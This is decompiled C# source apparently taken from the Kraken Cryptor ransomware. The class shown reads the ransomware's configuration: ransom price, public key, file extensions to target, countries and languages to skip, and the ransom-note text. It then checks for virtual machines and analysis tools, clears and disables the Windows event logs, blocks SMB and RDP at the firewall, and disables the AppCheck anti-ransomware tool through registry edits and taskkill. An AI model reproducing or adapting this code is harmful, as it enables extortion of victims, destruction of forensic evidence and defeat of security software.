using System;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Main;
using NiceJson;
using ns0;

namespace ns1;

internal static class Class4
{
	public sealed class Class5
	{
		[CompilerGenerated]
		private static string string_0;

		[CompilerGenerated]
		private static double double_0;

		[CompilerGenerated]
		private static string string_1;

		[CompilerGenerated]
		private static bool bool_0;

		[CompilerGenerated]
		private static bool bool_1;

		[CompilerGenerated]
		private static bool bool_2;

		[CompilerGenerated]
		private static bool bool_3;

		[CompilerGenerated]
		private static bool bool_4;

		[CompilerGenerated]
		private static bool bool_5;

		[CompilerGenerated]
		private static bool bool_6;

		[CompilerGenerated]
		private static bool bool_7;

		[CompilerGenerated]
		private static bool bool_8;

		[CompilerGenerated]
		private static bool bool_9;

		[CompilerGenerated]
		private static bool bool_10;

		[CompilerGenerated]
		private static bool bool_11;

		[CompilerGenerated]
		private static bool bool_12;

		[CompilerGenerated]
		private static string string_2;

		[CompilerGenerated]
		private static string string_3;

		[CompilerGenerated]
		private static double double_1;

		[CompilerGenerated]
		private static string string_4;

		[CompilerGenerated]
		private static string string_5;

		[CompilerGenerated]
		private static int int_0;

		[CompilerGenerated]
		private static int int_1;

		[CompilerGenerated]
		private static int int_2;

		[CompilerGenerated]
		private static string[] string_6;

		[CompilerGenerated]
		private static string[] string_7;

		[CompilerGenerated]
		private static string[] string_8;

		[CompilerGenerated]
		private static string[] string_9;

		[CompilerGenerated]
		private static string[] string_10;

		[CompilerGenerated]
		private static string[] string_11;

		[CompilerGenerated]
		private static int int_3;

		[CompilerGenerated]
		private static string string_12;

		[CompilerGenerated]
		private static string string_13;

		[CompilerGenerated]
		private static string string_14;

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_0(string string_15)
		{
			string_0 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static double smethod_1()
		{
			return double_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_2(double double_2)
		{
			double_0 = double_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_3(string string_15)
		{
			string_1 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_4()
		{
			return bool_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_5(bool bool_13)
		{
			bool_0 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_6()
		{
			return bool_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_7(bool bool_13)
		{
			bool_1 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_8()
		{
			return bool_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_9(bool bool_13)
		{
			bool_2 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_10()
		{
			return bool_3;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_11(bool bool_13)
		{
			bool_3 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_12()
		{
			return bool_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_13(bool bool_13)
		{
			bool_4 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_14()
		{
			return bool_5;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_15(bool bool_13)
		{
			bool_5 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_16()
		{
			return bool_6;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_17(bool bool_13)
		{
			bool_6 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_18()
		{
			return bool_7;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_19(bool bool_13)
		{
			bool_7 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_20()
		{
			return bool_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_21(bool bool_13)
		{
			bool_8 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_22()
		{
			return bool_9;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_23(bool bool_13)
		{
			bool_9 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_24()
		{
			return bool_10;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_25(bool bool_13)
		{
			bool_10 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_26()
		{
			return bool_11;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_27(bool bool_13)
		{
			bool_11 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static bool smethod_28()
		{
			return bool_12;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_29(bool bool_13)
		{
			bool_12 = bool_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_30()
		{
			return string_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_31(string string_15)
		{
			string_2 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_32()
		{
			return string_3;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_33(string string_15)
		{
			string_3 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static double smethod_34()
		{
			return double_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_35(double double_2)
		{
			double_1 = double_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_36()
		{
			return string_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_37(string string_15)
		{
			string_4 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_38()
		{
			return string_5;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_39(string string_15)
		{
			string_5 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_40()
		{
			return int_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_41(int int_4)
		{
			int_0 = int_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_42()
		{
			return int_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_43(int int_4)
		{
			int_1 = int_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_44()
		{
			return int_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_45(int int_4)
		{
			int_2 = int_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string[] smethod_46()
		{
			return string_6;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_47(string[] string_15)
		{
			string_6 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string[] smethod_48()
		{
			return string_7;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_49(string[] string_15)
		{
			string_7 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string[] smethod_50()
		{
			return string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_51(string[] string_15)
		{
			string_8 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string[] smethod_52()
		{
			return string_9;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_53(string[] string_15)
		{
			string_9 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string[] smethod_54()
		{
			return string_10;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_55(string[] string_15)
		{
			string_10 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string[] smethod_56()
		{
			return string_11;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_57(string[] string_15)
		{
			string_11 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_58()
		{
			return int_3;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_59(int int_4)
		{
			int_3 = int_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_60()
		{
			return string_12;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_61(string string_15)
		{
			string_12 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_62()
		{
			return string_13;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_63(string string_15)
		{
			string_13 = string_15;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_64()
		{
			return string_14;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_65(string string_15)
		{
			string_14 = string_15;
		}
	}

	public static bool smethod_0()
	{
		try
		{
			JsonNode jsonNode = JsonNode.smethod_6(Encoding.UTF8.GetString(Class14.smethod_1()));
			Class5.smethod_0(JsonNode.smethod_2(jsonNode["project"]["name"]));
			Class5.smethod_2(JsonNode.smethod_4(jsonNode["project"]["version"]));
			Class5.smethod_3(JsonNode.smethod_2(jsonNode["project"]["comment"]));
			Class5.smethod_5(JsonNode.smethod_5(jsonNode["module"]["anti_forensic"]));
			Class5.smethod_7(JsonNode.smethod_5(jsonNode["module"]["anti_revere"]));
			Class5.smethod_9(JsonNode.smethod_5(jsonNode["module"]["anti_virtual"]));
			Class5.smethod_13(JsonNode.smethod_5(jsonNode["module"]["anti_smb"]));
			Class5.smethod_11(JsonNode.smethod_5(jsonNode["module"]["anti_rdp"]));
			Class5.smethod_15(JsonNode.smethod_5(jsonNode["module"]["country_check"]));
			Class5.smethod_17(JsonNode.smethod_5(jsonNode["module"]["keyboard_check"]));
			Class5.smethod_19(JsonNode.smethod_5(jsonNode["module"]["registry_check"]));
			Class5.smethod_21(JsonNode.smethod_5(jsonNode["module"]["fix_device"]));
			Class5.smethod_23(JsonNode.smethod_5(jsonNode["module"]["network_device"]));
			Class5.smethod_25(JsonNode.smethod_5(jsonNode["module"]["flash_device"]));
			Class5.smethod_27(JsonNode.smethod_5(jsonNode["module"]["extension_bypass"]));
			Class5.smethod_29(JsonNode.smethod_5(jsonNode["module"]["rapid_mode"]));
			Class5.smethod_31(JsonNode.smethod_2(jsonNode["core"]["support_email_1"]));
			Class5.smethod_33(JsonNode.smethod_2(jsonNode["core"]["support_email_2"]));
			Class5.smethod_35(JsonNode.smethod_4(jsonNode["core"]["price"]));
			Class5.smethod_37(JsonNode.smethod_2(jsonNode["core"]["price_unit"]));
			Class5.smethod_39(JsonNode.smethod_2(jsonNode["core"]["public_key"]));
			Class5.smethod_41(JsonNode.smethod_3(jsonNode["core"]["main_cipher_key_size"]));
			Class5.smethod_43(JsonNode.smethod_3(jsonNode["core"]["session_cipher_key_size"]));
			Class5.smethod_45(JsonNode.smethod_3(jsonNode["core"]["aes_cipher_key_size"]));
			Class5.smethod_47(smethod_1(jsonNode["core"]["target_extensions"].method_0()));
			Class5.smethod_59(JsonNode.smethod_3(jsonNode["core"]["delay_sec"]));
			Class5.smethod_49(smethod_1(jsonNode["core"]["countries"].method_0()));
			Class5.smethod_51(smethod_1(jsonNode["core"]["languages"].method_0()));
			Class5.smethod_53(smethod_1(jsonNode["core"]["skip_files"].method_0()));
			Class5.smethod_55(smethod_1(jsonNode["core"]["skip_directories"].method_0()));
			Class5.smethod_57(smethod_1(jsonNode["core"]["process_stop"].method_0()));
			Class5.smethod_61(JsonNode.smethod_2(jsonNode["core"]["help_file"]["name"]));
			Class5.smethod_63(JsonNode.smethod_2(jsonNode["core"]["help_file"]["extension"]));
			Class5.smethod_65(JsonNode.smethod_2(jsonNode["core"]["help_file"]["body"]));
			Thread.Sleep(Class5.smethod_58() * 1000);
			if (Class5.smethod_8() && Miscellaneous.smethod_14())
			{
				return false;
			}
			if (Class5.smethod_6() && Miscellaneous.smethod_15())
			{
				return false;
			}
			if (!Class6.smethod_0())
			{
				return false;
			}
			if (Class5.smethod_16())
			{
				string text = Miscellaneous.smethod_19();
				if (text != null)
				{
					if (text.Contains(","))
					{
						string[] array = text.Split(new char[1] { ',' });
						foreach (string text2 in array)
						{
							string[] array2 = Class5.smethod_50();
							for (int j = 0; j < array2.Length; j++)
							{
								if (array2[j] == text2)
								{
									return false;
								}
							}
						}
					}
					else
					{
						string[] array = Class5.smethod_50();
						for (int i = 0; i < array.Length; i++)
						{
							if (array[i] == text)
							{
								return false;
							}
						}
					}
				}
			}
			if (Class5.smethod_14())
			{
				string[] array = Class5.smethod_48();
				foreach (string text3 in array)
				{
					if (Class6.Class7.smethod_16().ToUpper() == text3.ToUpper())
					{
						return false;
					}
				}
			}
			if (Class5.smethod_18() && !Miscellaneous.smethod_20())
			{
				return false;
			}
			if (Class5.smethod_4())
			{
				Miscellaneous.smethod_10("cmd.exe", "/C wevtutil.exe clear-log Application");
				Miscellaneous.smethod_10("cmd.exe", "/C wevtutil.exe clear-log Security");
				Miscellaneous.smethod_10("cmd.exe", "/C wevtutil.exe clear-log System");
				Miscellaneous.smethod_10("cmd.exe", "/C sc config eventlog start=disabled");
				Miscellaneous.smethod_10("cmd.exe", "sc stop eventlog");
				Miscellaneous.smethod_10("cmd.exe", "/C REG add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\eventlog\" / v Start / t REG_DWORD / d 4 / f");
			}
			if (Class5.smethod_12() || Class5.smethod_10())
			{
				Miscellaneous.smethod_10("cmd.exe", "/C NetSh Advfirewall set allprofiles state on");
			}
			if (Class5.smethod_12())
			{
				Miscellaneous.smethod_10("cmd.exe", "/C netsh advfirewall firewall add rule name=\"SMB Protocol Block\" protocol=TCP dir=in localport=445 action=block");
			}
			if (Class5.smethod_10())
			{
				Miscellaneous.smethod_10("cmd.exe", "/C netsh advfirewall firewall add rule name=\"RDP Protocol Block\" protocol=TCP dir=in localport=3389 action=block");
			}
			Miscellaneous.smethod_18(Class5.smethod_56());
			if (Miscellaneous.smethod_21("appcheck"))
			{
				Miscellaneous.smethod_10("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v ProductVersion /t REG_SZ /d \"Please contact with \"Kraken Cryptor\" support for decrypt your files.\" /f");
				Miscellaneous.smethod_10("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v RansomBackupExt/t REG_SZ /d \"NULL\" /f");
				Miscellaneous.smethod_10("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v Options /t REG_DWORD /d 0 /f");
				Miscellaneous.smethod_10("cmd.exe", "/C taskkill /F /IM appcheck.exe");
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static string[] smethod_1(string string_0)
	{
		return string_0.Replace("[\n\t\"", "").Replace("\n\t\"", "").Replace("\"", "")
			.Replace("\n]", "")
			.Replace("[\n\t", "")
			.Replace("\n\t", "")
			.Split(new char[1] { ',' });
	}
}
